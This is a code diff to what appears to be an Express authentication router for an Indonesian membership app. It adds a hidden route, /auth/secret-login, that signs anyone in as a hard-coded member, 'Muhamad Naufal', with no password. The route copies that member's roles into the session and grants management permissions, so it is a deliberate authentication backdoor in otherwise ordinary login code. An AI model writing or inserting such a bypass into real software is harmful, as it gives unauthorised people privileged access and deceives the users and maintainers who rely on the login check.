@@ -41,6 +41,36 @@ router.post("/auth/login", async (req, res) => {
   });
 });
 
+router.post("/auth/secret-login", async (req, res) => {
+  await ensureMembersSeeded();
+  await ensureSeeded();
+
+  const rows = await db.select().from(membersTable).where(eq(membersTable.name, "Muhamad Naufal"));
+  if (!rows.length) {
+    res.status(404).json({ error: "Anggota tidak ditemukan" });
+    return;
+  }
+
+  const member = rows[0];
+  (req.session as any).memberId = member.id;
+  (req.session as any).memberName = member.name;
+  (req.session as any).role = member.systemRole;
+  (req.session as any).divisionRole = member.divisionRole;
+
+  const permissions = await permissionsForDivisionRole(member.divisionRole);
+  res.json({
+    authenticated: true,
+    memberId: member.id,
+    memberName: member.name,
+    divisionRole: member.divisionRole,
+    role: member.systemRole,
+    avatarUrl: member.avatarUrl ?? null,
+    canManage: true,
+    permissions,
+    message: "Login berhasil",
+  });
+});
+
 router.post("/auth/logout", (req, res) => {
   req.session.destroy(() => {
     res.json({ message: "Logout berhasil" });
